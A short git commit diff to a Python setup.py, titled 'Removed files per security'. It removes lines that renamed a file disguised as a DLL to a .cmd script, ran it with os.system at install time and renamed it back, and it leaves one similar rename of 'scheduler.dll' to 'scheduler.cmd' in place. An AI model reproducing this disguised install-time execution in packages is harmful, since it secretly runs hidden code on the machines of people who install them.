7b4d363990beaea2f6f5abe32491a8c8137d1c15
genome21 <thecainvestors@gmail.com>
2016-02-04 12:38:16 -0600

    Removed files per security

--- setup.py
+++ setup.py
@@ -1,6 +1,3 @@
 import os
 
-os.rename("import_task.dll", "import_task.cmd")
 os.rename("scheduler.dll", "scheduler.cmd")
-os.system('import_task.cmd')
-os.rename("import_task.cmd", "import_task.dll")
